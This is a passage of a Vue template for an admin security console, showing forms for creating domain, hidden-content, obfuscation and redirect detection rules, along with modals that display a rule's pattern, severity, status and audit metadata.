            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="domainCreateForm.description"
            rows="2"
            placeholder="Explain why this domain is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="domainCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingDomainRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingDomainRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingDomainRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingDomainRule ? 'Creating...' : 'Create Domain Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Hidden Content Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'hidden_content' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- CSS Declaration / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            CSS Declaration / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="hiddenContentCreateForm.pattern"
            type="text" 
            placeholder="e.g. display:none, opacity:0, font-size:0, visibility:hidden"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="INJECTION">Injection</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="hiddenContentCreateForm.description"
            rows="2"
            placeholder="Explain why this hidden content pattern is flagged or prohibited..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="hiddenContentCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHiddenContentRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHiddenContentRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingHiddenContentRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHiddenContentRule ? 'Creating...' : 'Create Hidden Content Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Obfuscation Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'obfuscation' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Pattern / Regex -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Regex <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="obfuscationCreateForm.pattern"
            type="text" 
            placeholder="e.g. eval\(|String\.fromCharCode|base64_decode"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="obfuscationCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="MALWARE">Malware</option>
              <option value="INJECTION">Injection</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="REDIRECT">Redirect</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="obfuscationCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="obfuscationCreateForm.description"
            rows="2"
            placeholder="Explain why this obfuscation pattern or script signature is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="obfuscationCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingObfuscationRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingObfuscationRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingObfuscationRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingObfuscationRule ? 'Creating...' : 'Create Obfuscation Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Redirect Rule Create Form (Real API) -->
      <form v-else-if="ruleForm.type === 'redirect' && !editingRule" @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Pattern / Heuristic -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Redirect Pattern / Heuristic <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="redirectCreateForm.pattern"
            type="text" 
            placeholder="e.g. window.location=, http-equiv=&quot;refresh&quot;, bit.ly/"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="redirectCreateForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="REDIRECT">Redirect</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="MALWARE">Malware</option>
              <option value="PHISHING">Phishing</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="redirectCreateForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="redirectCreateForm.description"
            rows="2"
            placeholder="Explain why this redirect pattern or URL shortener is flagged..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground font-medium">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="redirectCreateForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingRedirectRule"
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingRedirectRule"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70"
          >
            <RefreshCw v-if="isSubmittingRedirectRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingRedirectRule ? 'Creating...' : 'Create Redirect Rule' }}</span>
          </button>
        </div>
      </form>

      <!-- Standard / Other Detection Rules Form -->
      <form v-else @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Rule Type -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Rule Type</label>
          <select 
            v-model="ruleForm.type"
            :disabled="!!editingRule"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          >
            <option value="keyword">Blacklisted Keyword / Phrase</option>
            <option value="domain">Malicious / Phishing Domain</option>
            <option value="hidden_content">Hidden Content Rule</option>
            <option value="html">Dangerous HTML Tag</option>
            <option value="attribute">Dangerous Event Attribute</option>
            <option value="redirect">Redirect Hijacking Rule</option>
          </select>
        </div>

        <!-- Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Token String <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="ruleForm.pattern"
            type="text" 
            placeholder="e.g. casino-example.com, <script>, onclick, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category</label>
            <input 
              v-model="ruleForm.category"
              type="text" 
              placeholder="e.g. Phishing, Spam, XSS"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            />
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity</label>
            <select 
              v-model="ruleForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            >
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="ruleForm.description"
            rows="2"
            placeholder="Explain why this token is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are checked during catalog scans</p>
          </div>
          <input 
            v-model="ruleForm.enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs"
          >
            {{ editingRule ? 'Save Changes' : 'Create Rule' }}
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW KEYWORD RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isView.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (selectedKeywordRule ? `Keyword Rule #${selectedKeywordRule.id}` : 'Keyword Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeKeywordViewModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedKeywordRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested keyword rule from the security engine.</p>
        <button 
          type="button"
          @click="closeKeywordViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Blocked Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedKeywordRule.keyword }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedKeywordRule.severity))">
              {{ selectedKeywordRule.severity }}
            </span>
            <!-- Match Type Badge -->
            <span class="px-2.5 py-1 rounded-full bg-muted text-xs font-mono font-semibold text-foreground border border-border">
              {{ selectedKeywordRule.match_type }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedKeywordRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedKeywordRule.description?.trim()">{{ selectedKeywordRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeKeywordViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW DOMAIN RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isView.value"
      :title="isDomainDetailsLoading ? 'Loading Domain Rule...' : (selectedDomainRule ? `Domain Rule #${selectedDomainRule.id}` : 'Domain Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeDomainViewModal"
    >
      <!-- Loading State -->
      <div v-if="isDomainDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving domain rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedDomainRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested domain rule from the security engine.</p>
        <button 
          type="button"
          @click="closeDomainViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Blocked Domain</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedDomainRule.domain }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedDomainRule.severity))">
              {{ selectedDomainRule.severity }}
            </span>
            <!-- Match Type Badge -->
            <span class="px-2.5 py-1 rounded-full bg-muted text-xs font-mono font-semibold text-foreground border border-border">
              {{ selectedDomainRule.match_type }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedDomainRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedDomainRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedDomainRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedDomainRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedDomainRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedDomainRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedDomainRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedDomainRule.description?.trim()">{{ selectedDomainRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedDomainRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedDomainRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedDomainRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedDomainRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeDomainViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW HIDDEN CONTENT RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isView.value"
      :title="isHiddenContentDetailsLoading ? 'Loading Hidden Content Rule...' : (selectedHiddenContentRule ? `Hidden Content Rule #${selectedHiddenContentRule.id}` : 'Hidden Content Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeHiddenContentViewModal"
    >
      <!-- Loading State -->
      <div v-if="isHiddenContentDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving hidden content rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedHiddenContentRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested hidden content rule from the security engine.</p>
        <button 
          type="button"
          @click="closeHiddenContentViewModal"
